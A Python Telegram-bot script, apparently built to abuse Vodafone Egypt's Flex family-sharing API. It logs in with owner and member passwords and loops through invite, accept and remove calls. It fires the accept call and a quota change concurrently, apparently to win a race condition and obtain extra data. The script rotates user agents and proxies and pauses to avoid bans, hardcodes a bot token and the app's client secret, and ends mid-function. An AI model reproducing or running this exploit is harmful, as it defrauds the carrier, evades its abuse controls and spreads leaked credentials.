import os
import sys
import random
import time
import json
import requests
import webbrowser
import pyfiglet
import re
import traceback
from threading import Thread
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import telebot
from telebot import types
from datetime import datetime

# --- تهيئة الألوان ---
init(autoreset=True)

# --- تعريفات الألوان ---
BRIGHT_YELLOW = Style.BRIGHT + Fore.YELLOW
WHITE = Fore.WHITE
CYAN = Fore.CYAN
ERROR_COLOR = Style.BRIGHT + Fore.RED
SUCCESS_COLOR = Style.BRIGHT + Fore.GREEN
MAGENTA = Style.BRIGHT + Fore.MAGENTA
GOLD = Style.BRIGHT + Fore.LIGHTYELLOW_EX
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

# --- البيانات الأساسية ---
NAME = f"{BOLD}{MAGENTA}مـاتصلوا ع النبي ツ❥{RESET}"

# --- إعدادات البوت ---
TELEGRAM_BOT_TOKEN = "7894565052:AAGua5sTPiNw8Y1SehVH-6KDMPaxEyChPgI"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
USER_SESSIONS = {}
RUNNING_CYCLES = {}

# --- إعدادات الـ API ---
AUTH_URL = 'https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token'
FAMILY_API_URL = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
CLIENT_ID = 'ana-vodafone-app'
CLIENT_SECRET = '95fd95fb-7489-4958-8ae6-d31a525cd20a'

SUBDOMAINS = [
    "mobile.vodafone.com.eg", "web.vodafone.com.eg", "010hotline.vodafone.com.eg", "dev.vodafone.com.eg",
    "digital.vodafone.com.eg", "ecommerce.vodafone.com.eg", "einvoice.vodafone.com.eg", "sb.vodafone.com.eg",
    "sm.vodafone.com.eg", "tenantapp.vodafone.com.eg", "workplace.vodafone.com.eg",
]

USER_AGENTS = [
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
]

session = requests.Session()
proxies_list = []

# --- إعدادات ثابتة مدمجة ---
DEFAULT_CONFIG = {
    'total_attempts': 150,
    'delays': {
        "1": 300.0,
        "2": 10.0,
        "3": 10.0,
        "4": 300.0,
        "5": 10.0
    },
    'task_order': [1, 2, 5, 3, 4],
    'sync_tasks': [5, 3],
    'retries_accept': 3,
    'retries_add_remove': 3,
    'subdomains_config': {
        "quota_10": 1,
        "add_member": 1,
        "quota_40": 1,
        "remove_member": 1
    },
    'use_proxies': False
}

# --- دوال العرض ---
def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"\n{MAGENTA}{'*' * 70}{RESET}")
    print(f"{MAGENTA}*{RESET} {BOLD}{MAGENTA}✨ {NAME} ✨{RESET} {' ' * 32} {MAGENTA}*{RESET}")
    print(f"{MAGENTA}*{RESET} {BOLD}أداة إدارة مجموعة فودافون فليكس الذكية{RESET} {' ' * 20} {MAGENTA}*{RESET}")
    print(f"{MAGENTA}{'*' * 70}{RESET}\n")

def print_separator():
    print(f"{CYAN}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{RESET}")

def print_success(message, chat_id=None):
    print(f"{SUCCESS_COLOR}✅ {message}{RESET}")
    if chat_id:
        bot.send_message(chat_id, f"✅ {message}")

def print_error(message, chat_id=None):
    print(f"{ERROR_COLOR}❌ {message}{RESET}")
    if chat_id:
        bot.send_message(chat_id, f"❌ {message}")

def print_info(message, chat_id=None):
    print(f"{CYAN}ℹ️  {message}{RESET}")
    if chat_id:
        bot.send_message(chat_id, f"ℹ️ {message}")

def print_warning(message, chat_id=None):
    print(f"{BRIGHT_YELLOW}⚠️  {message}{RESET}")
    if chat_id:
        bot.send_message(chat_id, f"⚠️ {message}")

def print_step(message, chat_id=None):
    print(f"{MAGENTA}🚀 {message}{RESET}")
    if chat_id:
        bot.send_message(chat_id, f"🚀 {message}")

# --- دوال مساعدة ---
def open_telegram_channel():
    try:
        webbrowser.open("https://t.me/ALFWEY")
        banner = pyfiglet.figlet_format("Vodafone Flex", font="small")
        print(f"{MAGENTA}{banner}{RESET}")
        print_success("تم فتح قناة التليجرام: https://t.me/ALFWEY")
    except Exception as e:
        print_error(f"خطأ في فتح قناة التليجرام: {e}")

def load_proxies(filename="proxies.txt"):
    global proxies_list
    try:
        with open(filename, 'r') as f:
            proxies_list = [line.strip() for line in f if line.strip()]
        if proxies_list:
            print_success(f"تم تحميل {len(proxies_list)} بروكسي بنجاح من {filename}")
            return True
        else:
            print_warning(f"ملف البروكسيات {filename} فارغ.")
            return False
    except FileNotFoundError:
        print_error(f"لم يتم العثور على ملف البروكسيات '{filename}'. سيتم المتابعة بدون بروكسي.")
        return False

def countdown(delay_time, chat_id=None):
    if delay_time <= 0:
        return
    for i in range(int(delay_time), 0, -1):
        print(f"\r{BRIGHT_YELLOW}⏳ جاري الانتظار لمدة {i} ثانية... {RESET}", end='', flush=True)
        if chat_id:
            bot.send_message(chat_id, f"⏳ جاري الانتظار لمدة {i} ثانية...")
        time.sleep(1)
    print("\r" + " " * 50, end='', flush=True)

def reset_user_session(user_id):
    USER_SESSIONS[user_id] = {
        'step': 0,
        'config': DEFAULT_CONFIG.copy(),
        'results': [],
        'proxies_list': [],
        'flex_amount': None,
        'running': False,
        'current_token': None,
        'last_quota': None,
        'cycle_state': "آه"  # Initialize cycle state
    }
    RUNNING_CYCLES[user_id] = False

def get_user_session(message):
    user_id = message.from_user.id
    if user_id not in USER_SESSIONS:
        reset_user_session(user_id)
    return USER_SESSIONS[user_id]

def save_user_config(user_id):
    config = USER_SESSIONS[user_id]['config']
    with open(f'basic_config_{user_id}.json', 'w', encoding='utf-8') as f:
        json.dump(config, f, ensure_ascii=False, indent=4)

def load_user_config(user_id):
    filename = f'basic_config_{user_id}.json'
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f)
    return None

# --- API Functions ---
def get_fresh_token(phone_number, password, chat_id=None):
    url = AUTH_URL
    headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": random.choice(USER_AGENTS)}
    data = {"username": phone_number, "password": password, "grant_type": "password",
            "client_secret": CLIENT_SECRET, "client_id": CLIENT_ID}
    try:
        print_info(f"جاري الحصول على access_token للرقم {phone_number}...", chat_id)
        response = session.post(url, headers=headers, data=data, timeout=20)
        response.raise_for_status()
        access_token = response.json().get("access_token")
        if access_token:
            print_success("تم الحصول على access_token بنجاح!", chat_id)
            return access_token
        else:
            print_error("لم يتم العثور على access_token.", chat_id)
            return None
    except requests.exceptions.RequestException as e:
        print_error(f"خطأ في الاتصال أثناء المصادقة: {e}", chat_id)
        return None

def is_token_valid(access_token, owner_number, user_agent):
    url = FAMILY_API_URL
    headers = create_headers(access_token, random.choice(SUBDOMAINS), user_agent, owner_number)
    try:
        response = requests.get(url, headers=headers, timeout=10)
        return response.status_code in [200, 201]
    except requests.exceptions.RequestException:
        return False

def create_headers(access_token_val, subdomain, user_agent, owner_number):
    subdomain_to_use = subdomain if subdomain else random.choice(SUBDOMAINS)
    base_headers = {
        "Authorization": f"Bearer {access_token_val}",
        "msisdn": owner_number,
        "Accept": "application/json",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": user_agent,
        "Origin": f"https://{subdomain_to_use}",
        "Referer": f"https://{subdomain_to_use}/spa/familySharing",
        "clientId": "WebsiteConsumer"
    }
    return base_headers

def change_quota(access_token, owner_number, member_number, quota, user_agent, results_dict, result_key, subdomain, proxy=None, cycle_state="آه", chat_id=None):
    url = FAMILY_API_URL
    headers = create_headers(access_token, subdomain, user_agent, owner_number)
    payload = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "parts": {
            "characteristicsValue": {"characteristicsValue": [{"characteristicName": "quotaDist1", "type": "percentage", "value": quota}]},
            "member": [{"id": [{"schemeName": "MSISDN", "value": owner_number}], "type": "Owner"},
                       {"id": [{"schemeName": "MSISDN", "value": member_number}], "type": "Member"}]
        }, "type": "QuotaRedistribution"
    }
    proxy_to_use = {"http": proxy, "https": proxy} if proxy else None
    
    print_step(f"إرسال طلب تغيير حصة {member_number} إلى {quota}% في دورة {cycle_state}", chat_id)
    
    if quota == "40" and cycle_state == "آه":
        try:
            response = requests.patch(url, headers=headers, json=payload, proxies=proxy_to_use, timeout=0.1)
            results_dict[result_key] = {'status': response.status_code, 'text': response.text}
        except requests.exceptions.Timeout:
            results_dict[result_key] = {'status': 'SYSTEM_TIMEOUT', 'text': 'Request timed out: System failure simulation'}
            print_error(f"فشل نظامي في تغيير حصة {member_number} إلى {quota}% في دورة {cycle_state}: مهلة الطلب انتهت! 😈", chat_id)
            return False
        except requests.exceptions.RequestException as e:
            results_dict[result_key] = {'status': 'SYSTEM_ERROR', 'text': str(e)}
            print_error(f"فشل نظامي في تغيير حصة {member_number} إلى {quota}% في دورة {cycle_state}: خطأ سيرفر! {e} 😈", chat_id)
            return False
    else:
        try:
            response = requests.patch(url, headers=headers, json=payload, proxies=proxy_to_use, timeout=30)
            results_dict[result_key] = {'status': response.status_code, 'text': response.text}
            if response.status_code in [200, 201]:
                print_success(f"تم تغيير حصة {member_number} إلى {quota}% بنجاح في دورة {cycle_state}", chat_id)
                return True
            else:
                print_error(f"فشل تغيير حصة {member_number} في دورة {cycle_state}: {response.status_code}", chat_id)
                return False
        except requests.exceptions.RequestException as e:
            results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
            print_error(f"خطأ اتصال لـ {member_number} في دورة {cycle_state}: {e}", chat_id)
            return False

def add_family_member(access_token, owner_number, member_number, quota_value, user_agent, results_dict, result_key, subdomain, max_retries, proxy=None, chat_id=None):
    url = FAMILY_API_URL
    headers = create_headers(access_token, subdomain, user_agent, owner_number)
    payload = {
        "name": "FlexFamily", "type": "SendInvitation", "category": [
            {"value": "523", "listHierarchyId": "PackageID"}, {"value": "47", "listHierarchyId": "TemplateID"},
            {"value": "523", "listHierarchyId": "TierID"}, {"value": "percentage", "listHierarchyId": "familybehavior"}
        ], "parts": { "member": [
            {"id": [{"value": owner_number, "schemeName": "MSISDN"}], "type": "Owner"},
            {"id": [{"value": member_number, "schemeName": "MSISDN"}], "type": "Member"}
        ], "characteristicsValue": {
            "characteristicsValue": [{"characteristicName": "quotaDist1", "value": str(quota_value), "type": "percentage"}]
        }
        }
    }
    proxy_to_use = {"http": proxy, "https": proxy} if proxy else None
    
    for attempt in range(max_retries):
        print_step(f"إرسال طلب دعوة لـ {member_number} بحصة {quota_value}% (محاولة {attempt + 1}/{max_retries})", chat_id)
        try:
            response = requests.post(url, data=json.dumps(payload), headers=headers, proxies=proxy_to_use, timeout=45)
            results_dict[result_key] = {'status': response.status_code, 'text': response.text}
            if response.status_code in [200, 201, 204]:
                print_success(f"تم إرسال الدعوة لـ {member_number} بنجاح", chat_id)
                return True
            else:
                print_error(f"فشل إرسال الدعوة: {response.status_code}", chat_id)
        except requests.exceptions.RequestException as e:
            results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
            print_error(f"خطأ اتصال في المحاولة {attempt + 1}: {e}", chat_id)
        
        if attempt < max_retries - 1:
            countdown(5, chat_id)
    
    print_error(f"فشل إرسال الطلب بعد {max_retries} محاولة.", chat_id)
    return False

def accept_invitation(member_token, owner_number, member_number, user_agent, results_dict, result_key, subdomain, proxy=None, chat_id=None):
    url = FAMILY_API_URL
    headers = {
        "Authorization": f"Bearer {member_token}",
        "msisdn": member_number,
        "Accept": "application/json",
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": user_agent,
        "Origin": f"https://{subdomain}",
        "Referer": f"https://{subdomain}/spa/familySharing",
        "clientId": "WebsiteConsumer"
    }
    payload = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "name": "FlexFamily",
        "parts": {
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": owner_number}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": member_number}], "type": "Member"}
            ]
        },
        "type": "AcceptInvitation"
    }
    proxy_to_use = {"http": proxy, "https": proxy} if proxy else None
    
    print_step(f"إرسال طلب قبول الدعوة للعضو {member_number}", chat_id)
    try:
        response = requests.patch(url, headers=headers, json=payload, proxies=proxy_to_use, timeout=30)
        results_dict[result_key] = {'status': response.status_code, 'text': response.text}
        if response.status_code in [200, 201]:
            print_success(f"تم قبول الدعوة من قبل {member_number}", chat_id)
            return True
        else:
            print_error(f"فشل قبول الدعوة: {response.status_code}", chat_id)
            return False
    except requests.exceptions.RequestException as e:
        results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
        print_error(f"خطأ في قبول الدعوة: {e}", chat_id)
        return False

def remove_flex_family_member(access_token, owner_number, member_number, user_agent, results_dict, result_key, subdomain, max_retries, proxy=None, chat_id=None):
    url = FAMILY_API_URL
    headers = create_headers(access_token, subdomain, user_agent, owner_number)
    payload = {
        "name": "FlexFamily", "type": "FamilyRemoveMember",
        "category": [{"value": "47", "listHierarchyId": "TemplateID"}],
        "parts": {
            "member": [
                {"id": [{"value": owner_number, "schemeName": "MSISDN"}], "type": "Owner"},
                {"id": [{"value": member_number, "schemeName": "MSISDN"}], "type": "Member"}
            ],
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "Disconnect", "value": "0"},
                    {"characteristicName": "LastMemberDeletion", "value": "1"}
                ]
            }
        }
    }
    proxy_to_use = {"http": proxy, "https": proxy} if proxy else None

    for attempt in range(max_retries):
        print_step(f"إرسال طلب حذف لـ {member_number} (محاولة {attempt + 1}/{max_retries})", chat_id)
        try:
            response = requests.patch(url, data=json.dumps(payload), headers=headers, proxies=proxy_to_use, timeout=30)
            results_dict[result_key] = {'status': response.status_code, 'text': response.text}
            if response.status_code in [200, 201]:
                print_success(f"تم حذف العضو {member_number} بنجاح", chat_id)
                return True
            else:
                print_error(f"فشل حذف العضو: {response.status_code}", chat_id)
        except requests.exceptions.RequestException as e:
            results_dict[result_key] = {'status': 'REQUEST_ERROR', 'text': str(e)}
            print_error(f"خطأ اتصال في المحاولة {attempt + 1}: {e}", chat_id)
        
        if attempt < max_retries - 1:
            countdown(5, chat_id)
    
    print_error(f"فشل حذف العضو بعد {max_retries} محاولة.", chat_id)
    return False

def get_flex_amount(owner_number, owner_password, chat_id=None):
    try:
        import string
        nonce = ''.join(random.choice(string.ascii_lowercase) for _ in range(10))
        
        with requests.Session() as session:
            base_url = 'https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/auth'
            redirect_uri = 'https://web.vodafone.com.eg/ar/KClogin'
            url_action = f"{base_url}?client_id=website&redirect_uri={redirect_uri}&state=random_state&response_mode=query&response_type=code&scope=openid&nonce={nonce}&kc_locale=en"
            response_url_action = session.get(url_action)
            soup = BeautifulSoup(response_url_action.content, 'html.parser')
            form_action = soup.find('form').get('action')
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://web.vodafone.com.eg',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'
            }
            data = {
                'username': owner_number,
                'password': owner_password,
            }
            response_login = session.post(form_action, headers=headers, data=data, allow_redirects=False)
            if 'Location' in response_login.headers and 'code=' in response_login.headers['Location']:
                code = response_login.headers['Location'].split('code=')[1]
                headers_token = {
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://web.vodafone.com.eg',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'
                }
                data_token = {
                    'code': code,
                    'grant_type': 'authorization_code',
                    'client_id': 'website',
                    'redirect_uri': redirect_uri
                }
                token_response = session.post('https://web.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token', headers=headers_token, data=data_token)
                token = token_response.json().get('access_token')
                
                if token:
                    url = f'https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?bucket.product.publicIdentifier={owner_number}&@type=aggregated'
                    headers = {
                        'channel': 'MOBILE',
                        'useCase': 'Promo',
                        'Authorization': f'Bearer {token}',
                        'api-version': 'v2',
                        'x-agent-operatingsystem': '11',
                        'clientId': 'AnaVodafoneAndroid',
                        'x-agent-device': 'OPPO CPH2059',
                        'x-agent-version': '2024.3.3',
                        'x-agent-build': '593',
                        'msisdn': owner_number,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'Accept-Language': 'ar',
                        'Host': 'web.vodafone.com.eg',
                        'Connection': 'Keep-Alive',
                        'Accept-Encoding': 'gzip',
                        'User-Agent': 'okhttp/4.11.0'
                    }
                    response = requests.get(url, headers=headers)
                    pattern = r'"usageType":"limit","bucketBalance":\[\{"remainingValue":\{"amount":(.*?),"units":"FLEX"'
                    match = re.search(pattern, response.text)
                    if match:
                        flex = int(float(match.group(1)))
                        print_info(f"كمية الفليكس: {flex} GB", chat_id)
                        return flex
        print_error("فشل استرجاع الفليكس: لا توجد بيانات متاحة", chat_id)
        return None
    except Exception as e:
        print_error(f"خطأ في استرجاع الفليكس: {e}", chat_id)
        return None

def show_loop_summary(loop_num, total_loops, success_count, fail_count, flex_amount=None, chat_id=None):
    summary = f"\n{GOLD}╔{'═'*65}╗\n"
    summary += f"║ {MAGENTA}┌─ ملخص الحلقة [{loop_num}/{total_loops}] ─┐{RESET}{' ' * 22}{GOLD}║\n"
    summary += f"╠{'═'*65}╣\n"
    summary += f"║ {SUCCESS_COLOR}✓ المهام الناجحة: {success_count}{' ' * 40}{GOLD}║\n"
    summary += f"║ {ERROR_COLOR}✗ المهام الفاشلة: {fail_count}{' ' * 41}{GOLD}║\n"
    
    if flex_amount is not None:
        summary += f"║ {CYAN}⏱️ كمية الفليكس المتبقية: {flex_amount} GB{' ' * 35}{GOLD}║\n"
    
    summary += f"╚{'═'*65}╝{RESET}"
    print(summary)
    if chat_id:
        bot.send_message(chat_id, summary)

# --- Telegram Bot Logic ---
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    reset_user_session(message.from_user.id)
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("بدء دورة إدارة مجموعة فليكس"), types.KeyboardButton("عرض الإعدادات الحالية"))
    markup.add(types.KeyboardButton("stop"))
    bot.send_message(message.chat.id, f"👋 أهلا بك في بوت إدارة مجموعة فودافون فليكس الذكي!\n\nاختر من اللوحة التالية:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "عرض الإعدادات الحالية")
def show_settings(message):
    session = get_user_session(message)
    conf = session['config']
    bot.reply_to(
        message,
        f"🔢 عدد التكرارات: {conf['total_attempts']}\n"
        f"⏱️ التأخيرات: {conf['delays']}\n"
        f"🔀 ترتيب المهام: {conf['task_order']}\n"
        f"🔄 المهام المتزامنة: {conf['sync_tasks']}\n"
        f"🧑‍💼 رقم المالك: {conf.get('owner_number', '---')}\n"
        f"👥 العضو1: {conf.get('member1_number', '---')}\n"
        f"👥 العضو2: {conf.get('member2_number', '---')}\n"
        f"🌐 بروكسي: {'نعم' if conf['use_proxies'] else 'لا'}\n"
        f"🔄 حالة الدورة: {session.get('cycle_state', 'آه')}",
        reply_markup=types.ReplyKeyboardRemove()
    )

@bot.message_handler(func=lambda m: m.text == "بدء دورة إدارة مجموعة فليكس")
def ask_owner_number(message):
    session = get_user_session(message)
    if session['running']:
        bot.send_message(message.chat.id, "⚠️ دورة جارية بالفعل! استخدم /stop لإيقافها أولاً.")
        return
    session['step'] = 1
    bot.send_message(message.chat.id, "👤 أدخل رقم المالك:")

@bot.message_handler(func=lambda m: get_user_session(m)['step'] == 1)
def ask_owner_pass(message):
    session = get_user_session(message)
    session['config']['owner_number'] = message.text.strip()
    session['step'] = 2
    bot.send_message(message.chat.id, "🔒 أدخل كلمة مرور المالك:")

@bot.message_handler(func=lambda m: get_user_session(m)['step'] == 2)
def ask_member1(message):
    session = get_user_session(message)
    session['config']['owner_password'] = message.text.strip()
    session['step'] = 3
    bot.send_message(message.chat.id, "👥 أدخل رقم العضو الأول:")

@bot.message_handler(func=lambda m: get_user_session(m)['step'] == 3)
def ask_member2(message):
    session = get_user_session(message)
    session['config']['member1_number'] = message.text.strip()
    session['step'] = 4
    bot.send_message(message.chat.id, "👥 أدخل رقم العضو الثاني:")

@bot.message_handler(func=lambda m: get_user_session(m)['step'] == 4)
def ask_member2_pass(message):
    session = get_user_session(message)
    session['config']['member2_number'] = message.text.strip()
    session['step'] = 5
    bot.send_message(message.chat.id, "🔑 أدخل كلمة مرور العضو الثاني:")

@bot.message_handler(func=lambda m: get_user_session(m)['step'] == 5)
def ask_proxy(message):
    session = get_user_session(message)
    session['config']['member2_password'] = message.text.strip()
    session['step'] = 6
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("نعم", "لا")
    bot.send_message(message.chat.id, "هل تريد استخدام بروكسيات؟", reply_markup=markup)

@bot.message_handler(func=lambda m: get_user_session(m)['step'] == 6)
def finish_config(message):
    session = get_user_session(message)
    use_proxy = message.text.strip() == "نعم"
    session['config']['use_proxies'] = use_proxy
    if use_proxy:
        session['proxies_list'] = load_proxies() and proxies_list or []
    session['step'] = 7
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("نعم", "لا")
    bot.send_message(message.chat.id, "هل تريد حفظ الإعدادات لاستخدامها لاحقًا?", reply_markup=markup)

@bot.message_handler(func=lambda m: get_user_session(m)['step'] == 7)
def ask_total_attempts(message):
    session = get_user_session(message)
    saveit = message.text.strip() == "نعم"
    if saveit:
        save_user_config(message.from_user.id)
        bot.send_message(message.chat.id, "✅ تم حفظ الإعدادات بنجاح!", reply_markup=types.ReplyKeyboardRemove())
    else:
        bot.send_message(message.chat.id, "تم تجاهل الحفظ.", reply_markup=types.ReplyKeyboardRemove())
    session['step'] = 8
    bot.send_message(message.chat.id, "🔢 أدخل عدد التكرارات اللي عايز تعمله (مثلاً: 150):")

@bot.message_handler(func=lambda m: get_user_session(m)['step'] == 8)
def final_save_and_start(message):
    session = get_user_session(message)
    try:
        total_attempts = int(message.text.strip())
        if total_attempts <= 0:
            bot.send_message(message.chat.id, "⚠️ العدد لازم يكون أكبر من صفر! جرب تاني.")
            return
        session['config']['total_attempts'] = total_attempts
        session['step'] = 0
        session['running'] = True
        RUNNING_CYCLES[message.from_user.id] = True
        bot.send_message(message.chat.id, f"🚦 جاري بدء الدورة بعد {total_attempts} تكرار...")
        run_flex_cycle(message)
    except ValueError:
        bot.send_message(message.chat.id, "⚠️ من فضلك ادخل رقم صحيح! جرب تاني.")
        session['step'] = 8

@bot.message_handler(func=lambda m: m.text == "stop")
def stop_cycle(message):
    user_id = message.from_user.id
    if user_id in RUNNING_CYCLES and RUNNING_CYCLES[user_id]:
        RUNNING_CYCLES[user_id] = False
        session = get_user_session(message)
        session['running'] = False
        bot.send_message(message.chat.id, "⏹️ تم إيقاف الدورة بنجاح!")
    else:
        bot.send_message(message.chat.id, "⚠️ لا توجد دورة جارية لإيقافها.")

def run_flex_cycle(message):
    user_id = message.from_user.id
    session = get_user_session(message)
    config = session['config']
    proxies_list = session['proxies_list']
    total_attempts = config['total_attempts']
    cycle_count = 0

    for i in range(total_attempts):
        if not RUNNING_CYCLES.get(user_id, False):
            print_info("⏹️ تم إيقاف الدورة من قبل المستخدم.", message.chat.id)
            break

        cycle_state = session['cycle_state']
        summary_msgs = []
        print_step(f"بدأت حلقة رقم {i+1}/{total_attempts} | دورة: {cycle_state}", message.chat.id)

        start_time = datetime.now()
        print_info(f"🔑 جاري التحقق من التوكن أو تجديده... (بدأ الساعة: {start_time.strftime('%H:%M:%S')})", message.chat.id)
        current_token = session['current_token']
        if not current_token or not is_token_valid(current_token, config['owner_number'], random.choice(USER_AGENTS)):
            current_token = get_fresh_token(config['owner_number'], config['owner_password'], message.chat.id)
            if not current_token:
                end_time = datetime.now()
                print_error(f"فشل الحصول على توكن جديد. سيتم تخطي الحلقة. (انتهى الساعة: {end_time.strftime('%H:%M:%S')}, المدة: {(end_time - start_time).total_seconds():.2f} ثانية)", message.chat.id)
                continue
            session['current_token'] = current_token
        end_time = datetime.now()
        summary_msgs.append(f"🔑 التوكن: ✅ (المدة: {(end_time - start_time).total_seconds():.2f} ثانية)")
        print_success(f"التوكن جاهز أو تم تجديده بنجاح! (انتهى الساعة: {end_time.strftime('%H:%M:%S')}, المدة: {(end_time - start_time).total_seconds():.2f} ثانية)", message.chat.id)

        current_ua = random.choice(USER_AGENTS)
        current_proxy = random.choice(proxies_list) if config['use_proxies'] and proxies_list else None
        results = {}

        member2_token = get_fresh_token(config['member2_number'], config['member2_password'], message.chat.id)

        for task_id in config['task_order']:
            if task_id == 1:
                start_time = datetime.now()
                change_quota(current_token, config['owner_number'], config['member1_number'], "10", 
                            current_ua, results, 'task1', random.choice(SUBDOMAINS), current_proxy, cycle_state, message.chat.id)
                end_time = datetime.now()
                summary_msgs.append(f"1️⃣ تغيير الحصة إلى 10%: {'✅' if results.get('task1', {}).get('status') in [200, 201] else '❌'} (المدة: {(end_time - start_time).total_seconds():.2f} ثانية)")
                countdown(config['delays']["1"], message.chat.id)
                
            elif task_id == 2:
                start_time = datetime.now()
                add_family_member(current_token, config['owner_number'], config['member2_number'], "10", 
                                 current_ua, results, 'task2', random.choice(SUBDOMAINS), 
                                 config['retries_add_remove'], current_proxy, message.chat.id)
                end_time = datetime.now()
                summary_msgs.append(f"2️⃣ دعوة العضو الثاني: {'✅' if results.get('task2', {}).get('status') in [200, 201, 204] else '❌'} (المدة: {(end_time - start_time).total_seconds():.2f} ثانية)")
                countdown(config['delays']["2"], message.chat.id)
                
            elif task_id == 3:
                if member2_token:
                    start_time = datetime.now()
                    print_info(f"بدء التزامن في دورة {cycle_state}: قبول الدعوة وتغيير الحصة إلى 40%", message.chat.id)
                    
                    threads = []
                    def run_accept():
                        ok = accept_invitation(member2_token, config['owner_number'], config['member2_number'], 
                                             current_ua, results, 'task3', random.choice(SUBDOMAINS), current_proxy, message.chat.id)
                        return ok

                    def run_quota():
                        ok = change_quota(current_token, config['owner_number'], config['member1_number'], "40", 
                                         current_ua, results, 'task5', random.choice(SUBDOMAINS), current_proxy, cycle_state, message.chat.id)
                        return ok

                    t1 = Thread(target=run_accept)
                    t2 = Thread(target=run_quota)
                    threads.append(t1)
                    threads.append(t2)
                    
                    for t in threads:
                        t.start()
                    
                    for t in threads:
                        t.join()
                    
                    end_time = datetime.now()
                    summary_msgs.append(f"3️⃣ قبول الدعوة وتغيير الحصة إلى 40%: {'✅' if results.get('task3', {}).get('status') in [200, 201] and results.get('task5', {}).get('status') in [200, 201] else '❌'} (المدة: {(end_time - start_time).total_seconds():.2f} ثانية)")
                    countdown(config['delays']["3"], message.chat.id)
                else:
                    print_error("فشل الحصول على توكن العضو الثاني. التخريب مستمر! 😈", message.chat.id)
                    summary_msgs.append("3️⃣ فشل الحصول على توكن العضو الثاني - تخطى المهمة.")
                
            elif task_id == 4:
                start_time = datetime.now()
                remove_flex_family_member(current_token, config['owner_number'], config['member2_number'], 
                                        current_ua, results, 'task4', random.choice(SUBDOMAINS), 
                                        config['retries_add_remove'], current_proxy, message.chat.id)
                end_time = datetime.now()
                summary_msgs.append(f"4️⃣ حذف العضو الثاني: {'✅' if results.get('task4', {}).get('status') in [200, 201] else '❌'} (المدة: {(end_time - start_time).total_seconds():.2f} ثانية)")
                
                start_time = datetime.now()
                flex_amount = get_flex_amount(config['owner_number'], config['owner_password'], message.chat.id)
                end_time = datetime.now()
                flex_msg = f"💡 كمية فليكس المتبقية: {flex_amount or 'غير متوفرة'} (المدة: {(end_time - start_time).total_seconds():.2f} ثانية)"
                summary_msgs.append(flex_msg)
                
                countdown(config['delays']["4"], message.chat.id)
                
            elif task_id == 5:
                pass

        session['cycle_state'] = "لا" if cycle_state == "آه" else "آه"
        
        success_count = sum(1 for res in results.values() if res and res.get('status') in [200, 201, 204])
        fail_count = len(results) - success_count
        show_loop_summary(i+1, total_attempts, success_count, fail_count, flex_amount, message.chat.id)
        
        cycle_count += 1
        if cycle_count % 5 == 0 and i + 1 < total_attempts:
            start_time = datetime.now()
            rest_time = random.uniform(10 * 60, 15 * 60)
            print_info(f"⏸️ جاري الراحة لمدة {rest_time/60:.1f} دقائق لتجنب الحظر... (بدأ الساعة: {start_time.strftime('%H:%M:%S')})", message.chat.id)
            countdown(rest_time, message.chat.id)
            end_time = datetime.now()
            print_info(f"▶️ تم استئناف الدورة بعد الراحة. (انتهى الساعة: {end_time.strftime('%H:%M:%S')}, المدة: {(end_time - start_time).total_seconds()/60:.1f} دقائق)", message.chat.id)

    if RUNNING_CYCLES.get(user_id, False):
